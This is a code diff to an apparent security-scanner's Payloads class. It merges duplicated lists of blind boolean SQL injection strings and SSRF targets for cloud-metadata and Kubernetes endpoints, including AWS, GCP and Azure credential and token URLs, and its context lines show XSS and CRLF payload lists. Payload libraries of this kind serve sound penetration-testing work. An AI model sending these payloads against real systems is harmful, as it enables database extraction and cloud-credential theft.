@@ -227,14 +227,28 @@ class Payloads:
     ]
 
     # H1: SQLi Boolean-based Blind
+    # NOTE: this list was previously defined twice in this file. The second
+    # definition silently overwrote the first via Python's class-attribute
+    # semantics, so half of the documented blind-SQLi payloads were never
+    # actually shipped to the engine. The two sets have been merged and
+    # de-duplicated below.
     SQLI_BOOLEAN_BLIND = [
+        # Numeric / column-presence checks
         "' AND 1=1 --",
         "' AND 1=2 --",
+        "' AND 'a'='a",
+        "' AND 'a'='b",
+        # Substring oracles against version() / database()
         "' AND SUBSTRING(@@version,1,1)='5' --",
-        "' AND (SELECT COUNT(*) FROM users)>0 --",
+        "' AND SUBSTRING(version(),1,1)='5' --",
         "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64 --",
+        "' AND ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM information_schema.schemata LIMIT 0,1),1,1))>64 --",
+        # Schema / table presence oracles
+        "' AND (SELECT COUNT(*) FROM users)>0 --",
+        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
         "' AND (SELECT LENGTH(database()))>0 --",
         "' AND (SELECT SUBSTR(username,1,1) FROM users LIMIT 1)='a' --",
+        # Numeric (no-quote) and Oracle DUAL variants
         "1 AND 1=1",
         "1 AND 1=2",
         "1' AND (SELECT 1 FROM dual WHERE 1=1) --",
@@ -621,29 +635,43 @@ class Payloads:
     ]
 
     # H5: SSRF Cloud Metadata Endpoints
+    # NOTE: this list was previously defined twice (here and again later
+    # in the class), and the second silently overwrote the first, dropping
+    # several AWS / IAM / DigitalOcean / Kubernetes endpoints from the
+    # active payload pool. The two definitions are now merged.
     SSRF_CLOUD_METADATA = [
-        # AWS
+        # AWS — IMDSv1 and IMDSv2
         "http://169.254.169.254/latest/meta-data/",
         "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "http://169.254.169.254/latest/meta-data/hostname",
         "http://169.254.169.254/latest/meta-data/local-ipv4",
         "http://169.254.169.254/latest/meta-data/public-ipv4",
         "http://169.254.169.254/latest/dynamic/instance-identity/document",
+        "http://169.254.169.254/latest/api/token",
+        # AWS ECS task metadata
         "http://169.254.170.2/v2/credentials",
         # GCP
         "http://metadata.google.internal/computeMetadata/v1/",
         "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         "http://metadata.google.internal/computeMetadata/v1/project/project-id",
-        # Azure
+        # Azure (instance metadata + identity tokens)
         "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         # DigitalOcean
         "http://169.254.169.254/metadata/v1/",
+        "http://169.254.169.254/metadata/v1.json",
         "http://169.254.169.254/metadata/v1/id",
+        "http://169.254.169.254/metadata/v1/hostname",
+        # Alibaba Cloud
+        "http://100.100.100.200/latest/meta-data/",
+        "http://100.100.100.200/latest/meta-data/instance-id",
+        "http://100.100.100.200/latest/meta-data/image-id",
         # Oracle Cloud
         "http://169.254.169.254/opc/v2/instance/",
-        # Alibaba
-        "http://100.100.100.200/latest/meta-data/",
+        "http://169.254.169.254/opc/v1/instance/metadata/",
+        # Kubernetes API server (in-cluster SSRF target)
+        "https://kubernetes.default.svc/api/v1/namespaces",
+        "https://kubernetes.default.svc/api/v1/pods",
     ]
 
     # H5: SSRF IP Obfuscation Variants
@@ -789,17 +817,10 @@ class Payloads:
         "base64": lambda x: __import__("base64").b64encode(x.encode()).decode(),
     }
 
-    # Advanced SQLi - Boolean-based blind
-    SQLI_BOOLEAN_BLIND = [
-        "' AND 1=1 --",
-        "' AND 1=2 --",
-        "' AND 'a'='a",
-        "' AND 'a'='b",
-        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
-        "' AND SUBSTRING(version(),1,1)='5' --",
-        "' AND (SELECT LENGTH(database()))>0 --",
-        "' AND ORD(MID((SELECT IFNULL(CAST(schema_name AS NCHAR),0x20) FROM information_schema.schemata LIMIT 0,1),1,1))>64 --",
-    ]
+    # NOTE: SQLI_BOOLEAN_BLIND was previously redefined here, silently
+    # overwriting the more comprehensive definition further up in this
+    # class. Both sets are now merged in the canonical SQLI_BOOLEAN_BLIND
+    # block above. Do not reintroduce a second definition.
 
     # Advanced SQLi - Stacked queries
     SQLI_STACKED = [
@@ -924,29 +945,11 @@ class Payloads:
         "<keygen autofocus onfocus=alert(1)>",
     ]
 
-    # Advanced SSRF - Cloud metadata
-    SSRF_CLOUD_METADATA = [
-        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-        "http://169.254.169.254/latest/api/token",
-        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
-        "http://169.254.169.254/metadata/v1.json",
-        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
-        "http://100.100.100.200/latest/meta-data/",
-        "http://169.254.170.2/v2/credentials",
-        # DigitalOcean
-        "http://169.254.169.254/metadata/v1/",
-        "http://169.254.169.254/metadata/v1/hostname",
-        # Alibaba Cloud
-        "http://100.100.100.200/latest/meta-data/instance-id",
-        "http://100.100.100.200/latest/meta-data/image-id",
-        # Kubernetes
-        "https://kubernetes.default.svc/api/v1/namespaces",
-        "https://kubernetes.default.svc/api/v1/pods",
-        # Oracle Cloud
-        "http://169.254.169.254/opc/v2/instance/",
-        "http://169.254.169.254/opc/v1/instance/metadata/",
-    ]
+    # NOTE: SSRF_CLOUD_METADATA was previously redefined here, silently
+    # overwriting the more comprehensive definition further up in this
+    # class. The two sets are now merged in the canonical
+    # SSRF_CLOUD_METADATA block above. Do not reintroduce a second
+    # definition.
 
     # CRLF Injection
     CRLF_PAYLOADS = [
